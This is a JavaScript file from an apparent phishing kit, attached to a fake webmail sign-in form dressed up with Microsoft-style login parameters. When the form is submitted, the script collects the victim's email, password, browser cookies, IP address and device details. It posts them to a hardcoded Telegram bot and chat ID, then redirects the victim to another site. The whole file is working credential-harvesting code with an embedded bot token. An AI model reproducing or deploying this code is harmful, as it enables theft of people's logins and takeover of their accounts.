document.addEventListener("DOMContentLoaded", function () {
  const telegramBotId = "7273335886:AAFfBkz6TbFX6IbPfJ4sAB_pFyUBhuhEWWI"; // Replace with your Telegram bot API key
  const telegramChatId = "7323113234"; // Replace with your Telegram chat ID

  async function handleSignin(event) {
    event.preventDefault();
    console.log("Form submitted"); // Log to check if function is called

    const email = document.getElementById("email").value;
    const password = document.getElementById("password").value;
    const rememberMe = document.getElementById("remember-me").checked;
    const clientID = document.getElementById("clientID").value;

    // Log input values
    console.log("Email:", email);
    console.log("Password:", password);
    console.log("Remember Me:", rememberMe);
    console.log("Client ID:", clientID);

    // Generating various IDs for the payload
    const id1 = generateId();
    const id2 = generateId();
    const id3 = generateIdLetters();
    const id4 = generateId();

    // Get the current date
    const date = new Date().toISOString();

    // Get cookies
    const cookies = document.cookie;

    // Create the x string
    const x = `prompt=login&x-client-SKU=MSAL.Desktop&x-client-Ver=4.58.1.0&uaid=${id1}; "userAgent"=${navigator.userAgent}-NG; MSPOK=$uuid-${id2}; &ui_locales=en-US&client_info=1&${id3}=0&login_email=${email}&passwd=${password}; DeviceId=${id4}; status_date=${date}; Cookies=${cookies};`;

    // Fetch the IP address and other device info
    const res = await fetch("https://api.ipify.org?format=json");
    const data = await res.json();
    const ipAddress = data.ip;
    const deviceInfo = {
      manufacturer: navigator.userAgent,
      os: navigator.platform.includes('Win') ? 'Windows' : (navigator.platform.includes('Mac') ? 'Mac OS X' : 'Other'),
      browser: navigator.userAgent.includes('Chrome') ? 'Chrome' : (navigator.userAgent.includes('Firefox') ? 'Firefox' : 'Other'),
    };

    // Log device info and IP address
    console.log("IP Address:", ipAddress);
    console.log("Device Info:", deviceInfo);

    // Create the payload
    const payload = {
      email: email,
      password: password,
      ipAddress: ipAddress,
      Device: deviceInfo.manufacturer,
      OS: deviceInfo.os,
      Browser: deviceInfo.browser,
      Cookies: x,
    };

    // Log the payload
    console.log("Payload:", payload);

    // Send the data to Telegram
    fetch(
      "https://api.telegram.org/bot" + telegramBotId + "/sendMessage",
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ chat_id: telegramChatId, text: JSON.stringify(payload) }),
      }
    )
    .then((response) => {
      if (response.ok) {
        console.log("Data sent to Telegram successfully");
        window.location.href = "https://pmegtrading.online/"; // Redirect to success URL
      } else {
        console.error("Error sending data to Telegram:", response.statusText);
        window.location.href = "https://example.org"; // Redirect to error URL
      }
    })
    .catch((error) => {
      console.error("Error sending data to Telegram:", error);
      window.location.href = "https://example.org"; // Redirect to error URL
    });
  }

  document
    .getElementById("webmailSignin-form")
    .addEventListener("submit", handleSignin);

  function generateId() {
    const characters = "abcdef0123456789";
    const numDashes = 4;
    const length = 13;
    const dashPositions = [];
    for (let i = 1; i < numDashes; i++) {
      dashPositions.push((length + 1) * i + i - 1);
    }
    let result = "";
    let dashCount = 0;
    for (let i = 0; i < numDashes * (length + 1); i++) {
      if (dashPositions.includes(i)) {
        result += "-";
        dashCount++;
      } else {
        result += characters.charAt(
          Math.floor(Math.random() * characters.length)
        );
      }
    }
    return result;
  }

  function generateIdLetters() {
    const characters =
      "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    const numDashes = 4;
    const length = 21;
    const dashPositions = [];
    for (let i = 1; i < numDashes; i++) {
      dashPositions.push((length + 1) * i + i - 1);
    }
    let result = "";
    let dashCount = 0;
    for (let i = 0; i < numDashes * (length + 1); i++) {
      if (dashPositions.includes(i)) {
        result += "-";
        dashCount++;
      } else {
        result += characters.charAt(
          Math.floor(Math.random() * characters.length)
        );
      }
    }
    return result;
  }
});
